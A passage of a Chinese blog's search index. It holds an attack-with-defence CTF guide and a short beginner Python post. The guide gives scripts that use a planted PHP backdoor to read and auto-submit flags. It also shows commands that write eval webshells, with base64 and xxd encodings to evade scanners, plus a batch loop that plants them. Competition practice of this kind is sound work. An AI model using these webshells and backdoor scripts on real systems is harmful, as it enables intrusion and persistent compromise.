class="line">Referer: &lt;http://192.168.182.130:39999/&gt;</span><br><span class="line"></span><br><span class="line">&#123;&quot;flag&quot;:&quot;SL&#123;7a2ecc20361b7a104798b6bba6222b3972e114a2&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p>编写脚本自动获取flag并提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># coding: UTF-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url1=&quot;&lt;http://xxxx&gt;:&quot;</span><br><span class="line">url2=&quot;&quot;</span><br><span class="line"></span><br><span class="line">flaglist=[]</span><br><span class="line"></span><br><span class="line">path=&quot;/include/shell.php&quot;</span><br><span class="line">passwd=&quot;admin_ccmd&quot;</span><br><span class="line"></span><br><span class="line">flagadd=&quot;&lt;http://xxxx:8801/api/flag&gt;&quot;   #提交flag的地址</span><br><span class="line"></span><br><span class="line">#payload = &#123;passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">payload = &#123;passwd: &#x27;system(\\&#x27;cat /flag\\&#x27;);&#x27;&#125;</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">headersflag=&#123;</span><br><span class="line">        &#x27;Host&#x27;: &#x27;xxxx&#x27;,</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;,</span><br><span class="line">        &#x27;Accept&#x27;: &#x27;application/json, text/plain, */*&#x27;,</span><br><span class="line">        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;,</span><br><span class="line">        &#x27;Content-Type&#x27;: &#x27;application/json;charset=utf-8&#x27;,</span><br><span class="line">        &#x27;Authorization&#x27;: &#x27;bada82467423a6526d4d25abbe8cc43a&#x27;,</span><br><span class="line">        &#x27;Origin&#x27;: &#x27;&lt;http://xxxx&gt;&#x27;,</span><br><span class="line">        &#x27;Referer&#x27;: &#x27;&lt;http://xxxx/&gt;&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">for url2 in range(8802,8810):</span><br><span class="line">    url = url1 + str(url2) +path</span><br><span class="line">    #print(url1 + str(url2))</span><br><span class="line">    res=requests.post(url,payload, headers=headers)</span><br><span class="line">    try:</span><br><span class="line">        print(url1 + str(url2),res.text)</span><br><span class="line">        # flag存入列表中</span><br><span class="line">        flaglist.append(str(res.text))</span><br><span class="line">        #print(flaglist[i])</span><br><span class="line">        body = &#123;&quot;flag&quot;: str(flaglist[i])&#125;</span><br><span class="line">        res = requests.post(flagadd, headers=headersflag, data=json.dumps(body))</span><br><span class="line">        i += 1</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><p>如果嫌写脚本麻烦，可以把flag存入字典，利用burp爆破，也可以实现批量提交flag。不过大括号<code>&#123;&#125;</code>可能会被编码导致flag错误。</p><h3 id="4-利用后门写shell"><a href="#4-利用后门写shell" class="headerlink" title="4.利用后门写shell"></a>4.利用后门写shell</h3><p>预留后门可能会被删除，要想持续拿分需要写shell，这里利用命令执行和代码执行来写马</p><p><strong>利用命令执行写马</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.Linux下写shell</span><br><span class="line">$ echo &quot;&lt;?php @eval(\\$_POST[123]); ?&gt;&quot; &gt; webshell.php</span><br><span class="line">$ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; webshell.php   #base64编码绕过</span><br><span class="line">$ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php #xxd绕过</span><br><span class="line"></span><br><span class="line">2.windows下写shell</span><br><span class="line">&gt;echo ^&lt;?php eval($^_POST[123]); ?^&gt; &gt; webshell.php</span><br></pre></td></tr></table></figure><p><strong>利用代码执行写马</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?code=fputs(fopen(&#x27;./webshell.php.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">?code=file_put_contents(&#x27;webshell.php.php&#x27;, &#x27;&lt;?php @eval($_POST[123]); ?&gt; &#x27;);</span><br><span class="line"></span><br><span class="line">?code=file_put_contents($_POST[f], $_POST[d]);</span><br><span class="line">post: f=webshell.php&amp;d=&lt;?php @eval($_POST[123]); ?&gt;</span><br></pre></td></tr></table></figure><p>然后利用脚本实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># coding: UTF-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;&lt;http://192.168.182.130:8808&gt;&quot;</span><br><span class="line"></span><br><span class="line">shell_path = url + &quot;/include/shell.php&quot;</span><br><span class="line">shell_passwd = &quot;admin_ccmd&quot;</span><br><span class="line"></span><br><span class="line">#利用预留后门</span><br><span class="line">payload = &#123;shell_passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">res = requests.post(shell_path, payload)</span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">#payload1利用预留后门上传shell</span><br><span class="line">payload1 = &#123;shell_passwd: &#x27;system(\\&#x27;echo &quot;&lt;?php @eval(\\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx.php\\&#x27;);&#x27;&#125;</span><br><span class="line">res = requests.post(shell_path, payload1)</span><br><span class="line">print(&quot;shell已上传&quot;)</span><br><span class="line"></span><br><span class="line">#payload2利用预留后门上传shell，并getflag</span><br><span class="line">my_shell_path = url + &quot;/atkx.php&quot;</span><br><span class="line">my_shell_passwd = &quot;atkx&quot;</span><br><span class="line">payload2 = &#123;my_shell_passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">res = requests.post(my_shell_path, payload2)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>批量后门写shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url_head=&quot;&lt;http://192.168.182.130&gt;&quot;</span><br><span class="line">for url2 in range(8801,8805):</span><br><span class="line">    try:</span><br><span class="line">        url =  url_head+&quot;:&#123;&#125;&quot;.format(url2)</span><br><span class="line"></span><br><span class="line">        shell_path = url + &quot;/include/shell.php&quot;</span><br><span class="line">        shell_passwd = &quot;admin_ccmd&quot;</span><br><span class="line">        print(shell_path)</span><br><span class="line"></span><br><span class="line">        #payload1利用预留后门上传shell</span><br><span class="line">        payload1 = &#123;shell_passwd: &#x27;system(\\&#x27;echo &quot;&lt;?php @eval(\\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx1.php\\&#x27;);&#x27;&#125;</span><br><span class="line">        res = requests.post(shell_path, payload1)</span><br><span class="line">        print(url + &quot; shell写入成功！！！！！！！&quot;)</span><br><span class="line">        #</span><br><span class="line"></span><br><span class="line">        # #payload2通过上传的shell来getflag</span><br><span class="line">        # my_shell_path = url + &quot;/atkx1.php&quot;</span><br><span class="line">        # my_shell_passwd = &quot;atkx&quot;</span><br><span class="line">        # payload2 = &#123;my_shell_passwd: &#x27;system(\\&#x27;cat /flag\\&#x27;);&#x27;&#125;</span><br><span class="line">        # res = requests.post(my_shell_path, payload2)</span><br><span class="line">        # print(url,res.text)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少。</p><p>2.AWD一般使用的是cms，尽量多收集一些cms的POC和EXP，以备不时之需。</p><p>3.防守注意查看日志看别人是怎么攻击自己的，然后尝试攻击其他人，为了干扰别人，可以先打一波流量，混淆视听。</p><p>4.检查后门，保证自己的网站上没有d盾可以扫出来的后门，检查计划任务或者可疑进程。</p><p>5.比赛一轮大概几分钟，时间比较紧张，需要提高自己的代码审计能力以及自动化脚本的编写能力，实现自动化攻击。</p>]]></content>
      
      
      <categories>
          
          <category> awd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h1 id="一、数学计算符"><a href="#一、数学计算符" class="headerlink" title="一、数学计算符"></a>一、数学计算符</h1><p>1.+加 -减 *乘 /除 //整除 %余数 **幂指数</p><p>2.变量：python的容器，跟print函数（打印数据类型及函数对象）</p><p>异曲同工：变量可以存放数据类型及函数对象，简短的代码（结果也属于Python中的数据类型）</p><p>使用变量来存放字符串及数值</p><p>存放的过程在Python中叫’赋值’，赋值就是=符号，不是数学中的等于</p><p>Python中的等于是”==”，赋值是”=”，一个’=’叫赋值，两个”==”叫等于</p><p>eg：1.</p><p>a=’小许’  b=3  c=3+4</p><p>print(c)</p><ol><li></li></ol><p>2==2</p><p>true 布尔值就是由条件判断得到的</p><p>变量，帮助我们减少代码的复杂性，增强可读性，不管用户输入什么都不会影响我们提前写好代码</p><h1 id="二、命名"><a href="#二、命名" class="headerlink" title="二、命名"></a>二、命名</h1><p>命名：采用驼峰命名法，字母开头(小写)，下换线结尾</p>]]></content>
      
      
      <categories>
          
          <category> 愿望期许 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第一篇 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
